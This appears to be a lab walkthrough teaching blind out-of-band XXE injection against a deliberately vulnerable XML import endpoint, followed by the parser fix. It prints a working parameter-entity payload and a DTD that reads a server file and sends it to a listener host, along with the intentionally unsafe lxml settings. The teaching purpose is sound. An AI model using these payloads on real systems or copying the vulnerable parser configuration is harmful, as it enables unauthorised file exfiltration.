# Walkthrough — xxe-blind-oob

The app parses an XML document you send it and answers the same generic `{"status": "received"}` every time — it never echoes anything back. That mute response hides a bug: the parser resolves **external entities**. A document whose preamble points an entity at a server you control makes the parser reach out to it, and the arrival of that request — not the response — is the proof. You will confirm the vulnerability out-of-band, then use the same entity resolution to exfiltrate a server-side file.

## 1. Context

Some vocabulary first, because the exploit is built out of it:

- **XML** documents can carry a **DTD** (Document Type Definition): an optional preamble, introduced by `<!DOCTYPE …>`, that can declare **entities** — named shortcuts the parser expands, like variables.
- An entity can be **external**, declared with the `SYSTEM` keyword and a URI. The URI can be a local file (`file:///etc/passwd`) or a network URL (`http://attacker/…`). If the parser resolves external entities, it **fetches** whatever the URI points at.
- A **parameter entity** (written with a `%`, e.g. `<!ENTITY % ext …>`) is an entity used *inside the DTD itself* rather than in the document body. It is processed while the DTD is parsed — which is what makes it useful when the body echoes nothing.
- **In-band** means the result comes back in the HTTP response (as in `xxe-basic`, where you read `/etc/passwd` off the page). **Out-of-band (OOB)** means the response says nothing and you observe the effect through a side channel — here, a request the parser makes to a **listener** you control.

The feature: `POST /import` takes an XML document in the request body and returns `{"status": "received"}` — a "bulk import" endpoint that acknowledges receipt and shows you nothing else. This is **XML External Entity (XXE) injection**, under **A05 — Security Misconfiguration**: the root cause is a dangerous parser setting (external-entity resolution left on), not a logic bug.

**The lab is three containers** (see [`docker-compose.yml`](./docker-compose.yml)):

- `vulnerable` (`127.0.0.1:8030`) and `fixed` (`127.0.0.1:8130`) — the importer, broken and patched.
- `oob-listener` — a dumb **out-of-band sink**. It serves the attacker's DTD and logs every request it receives. It is a **tripwire, not a target**: it holds no secret. It is **not** published to the host, so `curl http://oob-listener/` from your laptop will not reach it; it is reachable only from inside the Docker networks, at the hostname `oob-listener` on port 80. You watch it through `docker compose logs oob-listener`.

**Why embed a listener?** In a real engagement you would use an external interaction server — Burp Collaborator, `interactsh`, a catcher you own on the internet. This lab is bound to `127.0.0.1` and cannot depend on reaching a third party, so it ships a self-hosted, air-gapped stand-in. Everything you do against it, you would do against Collaborator in the field — and every callback here stays on your machine.

Primary track is Burp Repeater (to fire the request) plus `docker compose logs` (to catch the callback). There is one actor: you, the pentester, probing the endpoint.

## 2. Spot the bug

Open [`vulnerable/app.py`](./vulnerable/app.py). The `/import` view is short:

```python
xml = request.data  # raw XML body (Content-Type: application/xml)
# VULNERABLE: parse untrusted XML with a parser that RESOLVES EXTERNAL ENTITIES, loads DTDs,
# and is allowed to reach the NETWORK (no_network=False). ...
parser = etree.XMLParser(resolve_entities=True, load_dtd=True, no_network=False)  # dangerous
try:
    etree.fromstring(xml, parser)  # parsing resolves the external entity -> OOB fetch
except etree.XMLSyntaxError:
    pass  # swallow: surfacing the parse error would leak an in-band oracle
return jsonify(status="received")  # generic: says nothing about what the parser resolved
```

The raw request body flows straight into `etree.fromstring(..., parser)`. The parser is built to resolve external entities (`resolve_entities=True`), process the DTD (`load_dtd=True`), and reach the network (`no_network=False`). Two audit questions:

- *Does the parser resolve an entity I declare in the document, including one that points at a server?* — **yes**. That is the XXE.
- *Can I read the result in the response?* — **no**. The route returns a fixed string and swallows parse errors. That is what makes it **blind**.

Both answers matter, and they are independent. The first is the vulnerability; the second is only how hard it is to confirm. The fix will be to turn off the parser's external-entity and DTD features — foreshadowed here, applied in [`DIFF.md`](./DIFF.md).

## 3. Exploitation via Burp Suite + logs (primary track)

The endpoint takes a raw XML body, so there is no form-encoding to fight (unlike `xxe-basic`, whose payload rode in a URL-encoded form field): you paste the XML straight into the Repeater body with `Content-Type: application/xml`.

### Step 1 — Baseline: meet the mute channel

Send a benign document first, so you know what "nothing happened" looks like. In Repeater:

```
POST /import HTTP/1.1
Host: 127.0.0.1:8030
Content-Type: application/xml
Content-Length: 64

<?xml version="1.0"?>
<import><item>Ada Lovelace</item></import>
```

Response:

```
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 22

{"status":"received"}
```

Now check the listener:

```bash
docker compose logs oob-listener
```

Nothing new — the benign document declared no external entity, so the parser reached out to nothing. **Sit with the response: `{"status":"received"}` is all you will ever get, whether the import "worked", failed, or did something you did not intend. The response cannot distinguish those. That is blind XXE, and it is why the rest of this walkthrough lives in the logs, not in the response.**

### Step 2 — Fire the payload

Now declare an external **parameter** entity that points at the listener, and reference it so the parser fetches it. The `.dtd` path is a fixed, recognizable marker you chose:

```
POST /import HTTP/1.1
Host: 127.0.0.1:8030
Content-Type: application/xml
Content-Length: 150

<?xml version="1.0"?>
<!DOCTYPE import [
  <!ENTITY % ext SYSTEM "http://oob-listener/proof-xxe-30.dtd">
  %ext;
]>
<import><item>test</item></import>
```

Response:

```
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 22

{"status":"received"}
```

The response is, once again, `{"status":"received"}` — **byte-for-byte the same as the baseline.** Burp shows you **nothing** about whether the parser reached the listener. If you stopped here, you could not claim the XXE fired. So don't stop here.

### Step 3 — Confirm out-of-band (the proof)

Read the listener's log:

```bash
docker compose logs oob-listener
```

```
oob-listener-1  | INFO:app:OOB HIT path=/proof-xxe-30.dtd from=172.18.0.3
oob-listener-1  | INFO:app:OOB HIT path=/proof-xxe-30/exfil?x=FLAG-xxe30-9f1c2a-EXAMPLE-not-a-real-secret from=172.18.0.3
```

Two callbacks landed — and the response body could not have told you about either.

**The first line is the confirmation.** The parser fetched `http://oob-listener/proof-xxe-30.dtd` — a host your laptop cannot even reach — because your document made it resolve the external parameter entity `%ext;`. `from=172.18.0.3` is the `vulnerable` container's address. That single hit, from a mute endpoint, is blind XXE proven out-of-band: the parser reached a destination you chose.

**The second line is the impact.** The DTD the listener served back is not inert — it is the classic blind-XXE exfiltration payload:

```dtd
<!ENTITY % file SYSTEM "file:///app/secret.txt">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://oob-listener/proof-xxe-30/exfil?x=%file;'>">
%eval;
%exfil;
```

Reading it top to bottom: `%file` reads a local file off the **app** server (`/app/secret.txt`); `%eval` builds a second entity, `%exfil`, whose URL embeds that file's contents; referencing `%exfil;` fires a request to the listener with the file in the query string. The result is the second log line: `x=FLAG-xxe30-9f1c2a-EXAMPLE-not-a-real-secret` — the app's own file, delivered to you out-of-band. (The value is an obviously fake lab placeholder, not a real secret.)

That is the whole blind-XXE skill: prove the parser reached out when you cannot see its result, then ride the same channel to pull a file out.

**A note on what exfiltrates cleanly.** This URL trick carries the file only if its contents are URL-safe on one line: a newline, or a `&`, `%`, or `>` in the file, breaks the constructed URI and the second request never fires (a real `libxml2` limitation). The lab's secret is a controlled single-line marker so the exfiltration is deterministic; against an arbitrary multi-line file you would often get the first callback (confirmation) but need error-based or more elaborate techniques to pull the contents. The out-of-band **confirmation** — the first hit — does not depend on any of that.

**A note on DNS.** This lab uses an HTTP callback because it is simple and self-contained. In the field the out-of-band signal is often a **DNS** pingback: egress filtering may stop an outbound HTTP connection, but the server can almost always still resolve a name, and that lookup reaches your interaction server. Same idea — a request escaping to a sink you control — over a channel more likely to survive filtering. Burp Collaborator and `interactsh` catch both.

## 4. What the vuln is NOT

Because the exploit produces no visible loot in the response, it is easy to draw the wrong lesson. Nail down what this is *not*:

- **Not "no echo, so nothing leaks."** The response revealed nothing, yet the XXE is real and a file walked out the OOB channel — the log proves it. Blindness is not absence. This is the misconception the atom exists to kill.
- **Not "hide the echo" as a fix.** The tempting fix after seeing `xxe-basic` is "stop returning the value." But this app *already* returns nothing, and it is fully vulnerable. The value coming back was never the bug; the **parser resolving the entity** is. Hiding output only removes your in-band confirmation.
- **Not in-band XXE (`xxe-basic`).** Same cause (a parser that resolves external entities), same fix (turn it off). What differs is the channel: there you read the file in the response; here you detect the callback out-of-band. Not a new bug — the same XXE with the direct channel removed.
- **Not RCE.** You made the parser fetch attacker-chosen URLs and disclose a file out-of-band. That is serious, but it is not code execution on the app server.
- **Not "the app's own SSRF."** The outbound request is issued by the **XML parser** resolving your entity, not by app code calling an HTTP client. It looks like a server-side request (and blind XXE can indeed reach internal services — "SSRF via XXE"), but the class is XXE and the fix is the XXE fix, which is why this atom lives in A05, not A10.

**Proof of isolation:** the benign document in Step 1 produces **no** hit, on either the vulnerable or the fixed app; only the payload, against the vulnerable app, makes the listener log a callback — and against the fixed app, not even that. The difference is entirely the parser, not the app logic and not the response.

## 5. Impact

**Blind XXE confirmed out-of-band, escalating to file exfiltration.** The floor is the confirmation: the parser resolves an external entity you declared and issues an outbound request to a destination you choose — proof the vulnerability is real despite a mute response, and the same primitive that can reach internal services (SSRF via XXE). The demonstrated ceiling here is out-of-band disclosure of an app-server file (`/app/secret.txt`) whose single-line, URL-safe contents ride out in a callback URL. It is **not** RCE, and arbitrary multi-line files hit the URI limitation noted above — so no over-claim that "any file leaks whole." XXE has other faces (error-based disclosure, in-band reads, denial of service); this atom is the out-of-band one. The listener is a tripwire, not a prize.

## 6. Why the fix works

See [`DIFF.md`](./DIFF.md) for the change. The fixed `/import` view builds its parser with the dangerous features **off**:

```python
parser = etree.XMLParser(resolve_entities=False, load_dtd=False, no_network=False)  # hardened
```

Replay Step 2 against <http://127.0.0.1:8130/import>:

```
POST /import HTTP/1.1
Host: 127.0.0.1:8130
Content-Type: application/xml
Content-Length: 150

<?xml version="1.0"?>
<!DOCTYPE import [
  <!ENTITY % ext SYSTEM "http://oob-listener/proof-xxe-30.dtd">
  %ext;
]>
<import><item>test</item></import>
```

Response: `200 OK`, body `{"status":"received"}` — **byte-identical to the vulnerable app's response.** Now read the log:

```bash
docker compose logs oob-listener
```

There is **no new hit** from the fixed container. With `resolve_entities=False` and `load_dtd=False`, the external parameter entity is never resolved, so the DTD is never fetched — no first callback, and therefore no exfiltration either. The response is the same in both apps; the only observable difference is the callback that does not happen. In blind XXE, that is exactly how you confirm the fix — the same way you confirmed the bug: out-of-band.

Two things the `DIFF.md` makes precise, because they are the point of the fix:

- **The fix is at the parser, not the response and not the network.** The response was already mute and still exploitable, so hiding it is no fix. And leaving the network reachable is fine: with entity and DTD resolution off, the parser resolves no external reference at all. `fixed` can still reach `oob-listener` on the network; it simply never tries to.
- **Both flags are load-bearing.** Turning off only one leaves a path that still fetches the DTD (the probe in [`DIFF.md`](./DIFF.md) shows this). The XXE fix is to disable external-entity resolution **and** DTD loading together.
